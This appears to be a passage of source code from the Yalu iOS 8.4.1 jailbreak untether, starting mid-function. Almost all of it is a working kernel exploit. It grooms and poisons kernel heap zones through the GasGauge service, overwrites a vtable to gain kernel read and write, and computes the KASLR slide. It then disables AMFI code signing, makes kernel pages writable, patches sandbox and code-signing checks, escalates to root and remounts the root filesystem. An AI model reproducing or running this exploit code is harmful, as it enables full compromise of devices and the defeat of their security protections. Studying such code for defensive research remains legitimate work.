					goodFound = true;
					break;
				}
				else if (nextMagic != 0)
				{
					UTZLog(@"[ERR:FAE] inappropriate heap structure: %4d -> %4d | [ %.8X != %.8X ]", i, *((uint16_t*)(&data[0])), nextMagic, VM_MAP_COPY_KERNEL_BUFFER);
					
					machDataIO.deallocate(i);
					badFound = true;
					break;
				}
				else
				{
					// normal flow
					machDataIO.deallocate(i);
				}
			}
			else
			{
				UTZLog(@"[ERR:FAE] invalid entry %d", i);
				break;
			}
		}
		else
		{
			// gap
		}
	}
	
	if (goodFound == false && badFound == false)
	{
		UTZLog(@"[ERR:FAE] nothing found, we have most likely overwritten real data, expect PANIC");
	}
	
bail:
	
	UTZLog(@"[INF:FAE] cleanup");
	
	machDataIO.cleanup();
	
	return goodFound;
}

#pragma mark -
#pragma mark main

int main(int argc, char** argv)
{
//	DON'T LOG TO FILE, IT IS MAKING EVERYTHING WORSE
//	int logFile = open("/var/mobile/Media/frl_untether.log", O_APPEND|O_CREAT|O_RDWR, 0666);
//	dup2(logFile, STDOUT_FILENO);
//	dup2(logFile, STDERR_FILENO);

	__unused int pp = getppid();
	bool success = false;
	
	GasGaugeService ggService1024;
	GasGaugeService ggService512;
	KernelReader<1024> kernelReader;
	KernelDumper<1024> kernelDumper;
	PatchFinder patchFinder;
	mach_port_t parentPort;
	mach_port_t childPort;
	
	uint8_t* kernelDump = nullptr;
	
	CPUExerciser<20> cpuExerciser;

	// start pulling CPU resources (context switching) to our application
	cpuExerciser.start();

#if defined(UNTETHER_FULL)
	UTZLog(@"[INF:UTZ] untether64 ppid: %5d", pp);
#endif

	uint32_t count = 5;
	
	// find adjacent elements in zone 1024

	while (count)
	{
		ggService1024.open();
		ggService1024.wait();
		
		if (FindAdjacentElements<1024>(ggService1024, parentPort, childPort) == true)
			break;

		ggService1024.close();
		
		count--;
	}
	
	// adjacent elements are found
	if (count != 0)
	{
	#if defined(UNTETHER_AMFI)
		UTZLog(@"[INF:UTZ] ------------======== Fried Apple Team ========------------");
		UTZLog(@"[INF:UTZ] ----                   smokin killz                   ----");
		UTZLog(@"[INF:UTZ] --                                                      --");
		UTZLog(@"[INF:UTZ] -             Yalu for iOS 8.4.1 untether by             -");
		UTZLog(@"[INF:UTZ] -      @ qwertyoruiop, getorix, mbazaliy, in7egral       -");
		UTZLog(@"[INF:UTZ] -                          ***                           -");
		UTZLog(@"[INF:UTZ] -   +420 swags @ windknown, comex, ih8sn0w, posixninja   -");
		UTZLog(@"[INF:UTZ] -      _morpheus_, haifisch, jk9357, ttwj, kim jong un   -");
		UTZLog(@"[INF:UTZ] -   -420 swags @ south (fake) korea, saurik, britta      -");
		UTZLog(@"[INF:UTZ] --                     ppid: %5d                      --", pp);
		UTZLog(@"[INF:UTZ] ----                                                  ----");
		WaitForLog();
	#endif

		static const uint32_t kTargetZoneOriginal		= 1024;
		static const uint32_t kTargetZoneParentPoisoned = 2048;
		static const uint32_t kTargetZoneChildPoisoned	= 512;
		
		uint64_t vtdump[kTargetZoneParentPoisoned / sizeof(uint64_t)] = {0};
		uint64_t child[kTargetZoneOriginal / sizeof(uint64_t)] = {0};
		
		kernelReader.init(ggService1024, parentPort, childPort);
		
		UTZLog(@"[INF:UTZ] poison zone.512");
		kernelReader.replaceChildWithObject(kTargetZoneChildPoisoned, [&ggService512] () {
			ggService512.open();
			ggService512.wait();
		});

		memcpy(child, kernelReader.getChildElement(), kTargetZoneOriginal);

		UTZLog(@"[INF:UTZ] get vtable address: 0x%.16llX", child[0]);

		UTZLog(@"[INF:UTZ] dump vtable...");
		uint8_t* dump = nullptr;
		
		kernelReader.readArbitraryData(child[0], kTargetZoneParentPoisoned, dump);

		memcpy(vtdump, dump, kTargetZoneParentPoisoned);
		
		uint64_t far = 0;
		
		UTZLog(@"[INF:UTZ] find KASLR...");
		WaitForLog();
		for (int i = 0; i < 30; i++)
		{
			if (vtdump[i] > 0xffffff8000000000 && 0xffffff9000000000 > vtdump [i] && (far == 0 || vtdump[i] < far))
			{
				far = vtdump[i];
			}
		}
		
		far -= 0xffffff8002002000;
		far &= ~0xFFFFF;
		far -= 0x300000;
		
		uint64_t kaslr_slide = far;
		
		if (kaslr_slide > 0x100000000)
		{
			UTZLog(@"[ERR:UTZ] invalid KASLR slide = 0x%llX (%llu)", kaslr_slide, kaslr_slide);
			goto bail;
		}
		
		UTZLog(@"[INF:UTZ] KASLR slide = 0x%llX (%llu)", kaslr_slide, kaslr_slide);
		
		// DUMP KERNEL HERE IF YOU HAVE PATCHFINDER
//		kernelDump = (uint8_t*)malloc(0x10000 * 256);
//	#if defined(UNTETHER_AMFI)
//		kernelDumper.init(&kernelReader, kaslr_slide, true);
//		kernelDumper.init(&kernelReader, kaslr_slide);
//		kernelDumper.dumpKernel(kernelDump, 0x10000 * 256);
//	#else
//		FILE* file = fopen("/var/mobile/Media/kernel.dump", "r");
//		fread(kernelDump, 1, 0x10000 * 256, file);
//		fclose(file);
//	#endif

		patchFinder.init(kaslr_slide);
		patchFinder.findPatchesForKernel(kernelDump);
		patchFinder.prinfOffsets();
		
	#if defined(UNTETHER_AMFI)
		vtdump[kGasGaugeVtable_requestPowerDomainState] = patchFinder.LDR_X0_X8_W1_SXTW_2;
	#elif defined(UNTETHER_FULL)
		vtdump[kGasGaugeVtable_requestPowerDomainState] = patchFinder.LDR_X0_X1_32;
	#endif

		// patch index
		vtdump[kGasGaugeVtable_getExternalTrapForIndex] = patchFinder.ADD_X0_232;

		// update vtable pointer in vtdump
		uint32_t childOffset = (kTargetZoneOriginal - kVMMapCopySize) / sizeof(uint64_t);
		vtdump[childOffset + 0] = kernelReader.getParentDataAddress();	// [117]
		vtdump[childOffset + 1] = child[1];								// [118]
		vtdump[childOffset + 2] = child[2];								// [119]
		vtdump[childOffset + 3] = child[3];								// [120]
		
		UTZLog(@"[INF:UTZ] move vtable and overwrite pointer");
		
		// overwrite parent data (w/o header) + entire child blob
		uint32_t overlapSize = kTargetZoneOriginal - kVMMapCopySize + kTargetZoneOriginal;
		kernelReader.overwriteElementsFromOffset(kVMMapCopySize, (uint8_t*)vtdump, overlapSize);

	#if defined(UNTETHER_AMFI)
		// set AMFI_GET_OUT_OF_MY_WAY to 1 (disable code signing verification)
		vtdump[kGasGaugeVtable_requestPowerDomainState] = patchFinder.STRB_W1_X8_W2_UXTW;
		kernelReader.overwriteElementsFromOffset(kVMMapCopySize, (uint8_t*)vtdump, overlapSize);
		ggService512.callIndex0Trap5(0x1, patchFinder.AMFI_GET_OUT_OF_MY_WAY - vtdump[147], 0x43434343, 0x44444444, 0x45454545);
		
		// vertify
		vtdump[kGasGaugeVtable_requestPowerDomainState] = patchFinder.LDR_X0_X8_W1_SXTW_2;
		kernelReader.overwriteElementsFromOffset(kVMMapCopySize, (uint8_t*)vtdump, overlapSize);
		uint32_t cs_flag = ggService512.callIndex0Trap5((patchFinder.AMFI_GET_OUT_OF_MY_WAY - vtdump[147])>>2, 0x42424242, 0x43434343, 0x44444444, 0x45454545);
		UTZLog(@"[INF:UTZ] 0x%.16llX: amfi_get_out_of_my_way = 0x%.8lX", patchFinder.AMFI_GET_OUT_OF_MY_WAY, cs_flag);
		
		// revert vtable pointer
		memcpy(&vtdump[childOffset], &child[0], kTargetZoneOriginal);
		
		// overwrite parent data (w/o header) + entire child blob
		kernelReader.overwriteElementsFromOffset(kVMMapCopySize, (uint8_t*)vtdump, kTargetZoneOriginal - kVMMapCopySize + kTargetZoneOriginal);
		
		UTZLog(@"[INF:UTZ] depoison zone.512");
		kernelReader.replaceObjectWithChild(kTargetZoneChildPoisoned, [&ggService512] () {
			ggService512.close();
			ggService512.wait();
		});
		
		// AFMI is disabled, ready to spawn actual untether
		if (cs_flag == 0x1)
			success = true;
	#endif

	#if defined(UNTETHER_FULL)
		
		#define WriteWhatWhere32(what, where) { \
			vtdump[kGasGaugeVtable_requestPowerDomainState] = patchFinder.STR_W3_X1_W2_UXTW; \
			kernelReader.overwriteElementsFromOffset(kVMMapCopySize, (uint8_t*)vtdump, overlapSize); \
			ggService512.callIndex0Trap5((uint64_t)where, 0x0, (uint32_t)what, 0x4444444444444444, 0x4545454545454545); \
		} \

		#define ReadWhere32(where, out) { \
			vtdump[kGasGaugeVtable_requestPowerDomainState] = patchFinder.LDR_X0_X1_32; \
			kernelReader.overwriteElementsFromOffset(kVMMapCopySize, (uint8_t*)vtdump, overlapSize); \
			out = ggService512.callIndex0Trap5((uint64_t)where - 32, 0x4242424242424242, 0x4343434343434343, 0x4444444444444444, 0x4545454545454545); \
		} \

		#define ReadWhere64(where, out) { \
			vtdump[kGasGaugeVtable_requestPowerDomainState] = patchFinder.LDR_X0_X1_32; \
			kernelReader.overwriteElementsFromOffset(kVMMapCopySize, (uint8_t*)vtdump, overlapSize); \
			uint32_t* tmp_hi_lo = (uint32_t*)&out; \
			tmp_hi_lo[0] = ggService512.callIndex0Trap5((uint64_t)where - 32, 0x4242424242424242, 0x4343434343434343, 0x4444444444444444, 0x4545454545454545); \
			tmp_hi_lo[1] = ggService512.callIndex0Trap5((uint64_t)where + 4 - 32, 0x4242424242424242, 0x4343434343434343, 0x4444444444444444, 0x4545454545454545); \
		} \

		uint64_t pages[50];
		int page_cnt = 0;
		pages[page_cnt++] = patchFinder.GET_R00T		& (~0xFFF);
		pages[page_cnt++] = patchFinder.VM_MAP_ENTER	& (~0xFFF);
		pages[page_cnt++] = patchFinder.VM_MAP_PROTECT	& (~0xFFF);
		pages[page_cnt++] = patchFinder.MOUNT_COMMON	& (~0xFFF);
		pages[page_cnt++] = patchFinder.TFP0			& (~0xFFF);
		pages[page_cnt++] = patchFinder.CS_ENFORCE		& (~0xFFF);
		pages[page_cnt++] = patchFinder.PROC_ENFORCE	& (~0xFFF);
		pages[page_cnt++] = patchFinder.ICHDB_1			& (~0xFFF);
		pages[page_cnt++] = patchFinder.ICHDB_2			& (~0xFFF);
		pages[page_cnt++] = patchFinder.MAPIO			& (~0xFFF);
		pages[page_cnt++] = patchFinder.SB_TRACE		& (~0xFFF);

		// work with memory pages
		// get PDE
		uint64_t pmap_store, pde_base;
		ReadWhere64(patchFinder.KERNEL_PMAP, pmap_store);
		UTZLog(@"[INF:UTZ] pmap_store: 0x%.16llX", pmap_store);
		ReadWhere64(pmap_store, pde_base);
		UTZLog(@"[INF:UTZ] pde_base: 0x%.16llX", pde_base);
		
		// get Physical and Virtual bases
		uint64_t gPhysBase, gVirtBase;
		ReadWhere64(patchFinder.PHYS_ADDR, gPhysBase);
		UTZLog(@"[INF:UTZ] gPhysBase: 0x%.16llX", gPhysBase);
		ReadWhere64(patchFinder.PHYS_ADDR - 8, gVirtBase);
		UTZLog(@"[INF:UTZ] gVirtBase: 0x%.16llX", gVirtBase);

		// thanks @PanguTeam
		
		const uint64_t addr_start = 0xffffff8000000000; // Analytical kernel page table starting address (25 bits to 1, TTBR1_EL1 setting)
		// Up to 3 layer mapping is 1G level2 block level1 of the block is 2M page is 4K
		// First, read the value of stage1
		uint64_t level1_data = 0;
		uint32_t * hi_lo = (uint32_t*)&level1_data;
		
		ReadWhere32(pde_base, hi_lo[0]);
		ReadWhere32(pde_base+4, hi_lo[1]);
		
		// read level2 (Each corresponds to 2M)
		uint64_t level2_base = (level1_data & 0xfffffff000) - gPhysBase + gVirtBase;
		uint64_t level2_krnl = level2_base + (((0xffffff8002002000 + kaslr_slide - addr_start) >> 21) << 3);
		// Use interface reads patch vtable table, after more stable
		uint64_t level2_data[15] = {0};
		
		UTZLog(@"[INF:UTZ] level2_base %llX level2_krnl %llX", level2_base, level2_krnl);
		
		hi_lo = (uint32_t*)&level2_data;
		for (int i = 0; i < sizeof(level2_data)/sizeof(uint32_t); i++) {
			ReadWhere32(level2_krnl+(i*4), hi_lo[i]);
		}
		
		UTZLog(@"[INF:UTZ] level2_data[0]=%llX level2_data[14]=%llX", level2_data[0], level2_data[14]);
		
		// change kernel code page to RW !
		// Try to modify the first four block
		for (int i = 0; i < 4; i++)
		{
			// You must not block access and RW
			if ((level2_data[i] & 3) != 1)
				continue;
			if (((level2_data[i] >> 6) & 1) != 0 || ((level2_data[i] >> 7) & 1) != 0)
			{
				level2_data[i] &= 0xffffffffffffff3f;
				// Covering the lower 4 bytes is enough
				UTZLog(@"[INF:UTZ]  to patch block page table");
				WriteWhatWhere32(level2_data[i], level2_krnl + i*8);
			}
		}
		// Modify the writable property address range
		uint64_t rw_krnl_end = (((0xffffff8002002000 + kaslr_slide) >> 21) << 21) + 0x200000*3 - 1;
		
		// Rewritten page table
		for (int i = 0; i < page_cnt; i++)
		{
			uint64_t rw_page_base = pages[i];
			// if (rw_page_base <= rw_krnl_end)
			//     continue;
			
			// First check level2 corresponds to the table
			int idx = (int)(((rw_page_base - addr_start) >> 21) - (((0xffffff8002002000 + kaslr_slide) - addr_start) >> 21));
			if ((level2_data[idx] & 3) != 3)
				continue;
			// level3, each corresponding to a 4K page
			uint64_t level3_base = (level2_data[idx] & 0xfffffff000) - gPhysBase + gVirtBase;
			uint64_t level3_krnl = level3_base + (((rw_page_base & 0x1fffff) >> 12) << 3);
			
			UTZLog(@"[INF:UTZ] va: %llx idx: %d level2: %llx level3_base: %llx pte_krnl: %llx", rw_page_base, idx, level2_data[idx], level3_base, level3_krnl);
			
			// read pte
			uint64_t level3_data = 0;
			hi_lo = (uint32_t*)&level3_data;
			
			ReadWhere32(level3_krnl, hi_lo[0]);
			ReadWhere32(level3_krnl+4, hi_lo[1]);
			
			
			// To RW
			if (((level3_data >> 6) & 1) != 0 || ((level3_data >> 7) & 1) != 0)
			{
				level3_data &= 0xffffffffffffff3f;
				// Covering the lower 4 bytes is enough
				UTZLog(@"[INF:UTZ]  to patch page table");
				WriteWhatWhere32( (uint32_t)level3_data, level3_krnl);
			}
		}
		
		// Invalidate TLB
		vtdump[kGasGaugeVtable_requestPowerDomainState] = patchFinder.INVALIDATE_TLB;
		kernelReader.overwriteElementsFromOffset(kVMMapCopySize, (uint8_t*)vtdump, overlapSize);
		ggService512.callIndex0Trap1(0);
		
		// Flush cache
		vtdump[kGasGaugeVtable_requestPowerDomainState] = patchFinder.FLUSHCACHE;
		kernelReader.overwriteElementsFromOffset(kVMMapCopySize, (uint8_t*)vtdump, overlapSize);
		ggService512.callIndex0Trap1(0);
		
		uint32_t kv = 0;
		
		ReadWhere32(patchFinder.VM_MAP_ENTER, kv);
		UTZLog(@"[INF:UTZ] kv: 0x%016llx", kv);
		ReadWhere32(patchFinder.TFP0, kv);
		UTZLog(@"[INF:UTZ] kv: 0x%016llx", kv);
		
		WriteWhatWhere32(0xD503201F, patchFinder.GET_R00T);
		WriteWhatWhere32(0xD503201F, patchFinder.VM_MAP_PROTECT);
		WriteWhatWhere32(0xF10003DF, patchFinder.VM_MAP_ENTER);
		WriteWhatWhere32(0xD503201F, patchFinder.TFP0);
		WriteWhatWhere32(0xD503201F, patchFinder.MOUNT_COMMON);
		WriteWhatWhere32(0xD503201F, patchFinder.SB_TRACE);
		WriteWhatWhere32(0x14000005, patchFinder.MAPIO);
		WriteWhatWhere32(0x1, patchFinder.CS_ENFORCE);
		WriteWhatWhere32(0x1, patchFinder.ICHDB_1);
		WriteWhatWhere32(0x1, patchFinder.ICHDB_2);
		WriteWhatWhere32(0x0, patchFinder.PROC_ENFORCE);
		
		ReadWhere32(patchFinder.VM_MAP_ENTER, kv);
		UTZLog(@"[INF:UTZ] kv: 0x%016llx", kv);
		ReadWhere32(patchFinder.TFP0, kv);
		UTZLog(@"[INF:UTZ] kv: 0x%016llx", kv);
		
		// Flush cache
		vtdump[kGasGaugeVtable_requestPowerDomainState] = patchFinder.FLUSHCACHE;
		kernelReader.overwriteElementsFromOffset(kVMMapCopySize, (uint8_t*)vtdump, overlapSize);
		ggService512.callIndex0Trap1(0);

		NSLog(@"[INF:UTZ] uid: %d", getuid());
		
		setreuid(0, 0);
		setuid(0);
		
		NSLog(@"[INF:UTZ] uid: %d", getuid());
		
		// revert vtable pointer
		memcpy(&vtdump[childOffset], &child[0], kTargetZoneOriginal);
		
		// overwrite parent data (w/o header) + entire child blob
		kernelReader.overwriteElementsFromOffset(kVMMapCopySize, (uint8_t*)vtdump, overlapSize);
		
		ggService512.close();
		ggService512.wait();
		
		UTZLog(@"[INF:UTZ] depoison zone.512");
		kernelReader.replaceObjectWithChild(kTargetZoneChildPoisoned, [&ggService512] () {
			ggService512.close();
			ggService512.wait();
		});
		
		success = true;
	#endif
	}
	
bail:
	
	UTZLog(@"[INF:UTZ] cleanup");
	
	kernelReader.cleanup();
	
	ggService512.close();
	ggService1024.close();
	
	cpuExerciser.stop();
	
	if (kernelDump)
		free(kernelDump);
	
#if defined(UNTETHER_AMFI)
	if (success)
	{
		pid_t untether_pid;
		char *untether_argv[] = {
			"/var/mobile/Media/untether64",
			nullptr
		};
		
		int ret = chmod("/var/mobile/Media/untether64", 755);
		if(ret == 0)
		{
			UTZLog(@"[INF:UTA] chmod untether64...");
		}
		else
		{
			UTZLog(@"[INF:UTA] chmod() failed %d", ret);
		}
		
		UTZLog(@"[INF:UTA] spawn untether64...");
		int status = posix_spawn(&untether_pid, "/var/mobile/Media/untether64", nullptr, nullptr, untether_argv, environ);
		if (status == 0)
		{
			UTZLog(@"[INF:UTA] ... done. Wait for %d", untether_pid);
			if (waitpid(untether_pid, &status, 0) != -1)
			{
				UTZLog(@"[INF:UTA] untether64 exited with %d", status);
			}
			else
			{
				UTZLog(@"[INF:UTA] waitpid error");
			}
		}
		else
		{
			UTZLog(@"[INF:UTA] posix_spawn(\"%s\") failed: %s (%d)", untether_argv[0], strerror(status), status);
		}
	}
#endif

#if defined(UNTETHER_FULL)
	if (success)
	{
		char* nm = strdup("/dev/disk0s1s1");
		int mntr = mount("hfs", "/", 0x10000, &nm);
		
		UTZLog(@"[INF:UTZ] Remounting / as read/write %d %s", mntr, strerror(errno));
		struct stat sb;
		if (stat("/yalu", &sb) != 0) {
			UTZLog(@"[INF:UTZ] /yalu not found, dropping myself..");
			char name[1024];
			uint32_t sz = 1024;
			_NSGetExecutablePath(&name[0], &sz);
			int o = open(name, O_RDONLY);
			int f = open("/yalu", O_RDWR|O_CREAT|O_TRUNC);
			int r = fcopyfile(o, f, 0, COPYFILE_ALL);
			UTZLog(@"[INF:UTZ] %d %d %d", o, f, r);
			if (stat("/var/mobile/Media/PhotoData/KimJongCracks/bootstrap.tar", &sb) == 0) {
				chmod("/var/mobile/Media/PhotoData/KimJongCracks/tar", 0777);
				
				UTZLog(@"[INF:UTZ] Installing loader.");
				chdir("/");
				
				UTZLog(@"[INF:UTZ] Beginning extraction.");
				int f = fork();
				if (f == 0) {
					execl("/var/mobile/Media/PhotoData/KimJongCracks/tar", "tar", "xvf", "/var/mobile/Media/PhotoData/KimJongCracks/bootstrap.tar", 0);
					exit(0);
				}
				waitpid(f, 0, 0);
				
				UTZLog(@"[INF:UTZ] Done extracting.");
				/*
				 this fucks shit up without an untether
				 f = fork();
				 if (f == 0) {
				 execl("/var/lib/dpkg/info/com.saurik.patcyh.extrainst_", "/var/lib/dpkg/info/com.saurik.patcyh.extrainst_", "install", 0);
				 exit(0);
				 }
				 waitpid(f, 0, 0);
				 */
				f = fork();
				if (f == 0) {
					setreuid(501,501);
					execl("/usr/bin/uicache", "uicache", 0);
					exit(0);
				}
				waitpid(f, 0, 0);
				UTZLog(@"[INF:UTZ] Done installing loader.");
				
				unlink("/var/mobile/Media/PhotoData/KimJongCracks/bootstrap.tar");
				kill(pp, 9);
			}
		}
		
		UTZLog(@"[INF:UTZ] ALL YOUR BASE ARE BELONG TO US");
	}
#endif

	exit(0);
}

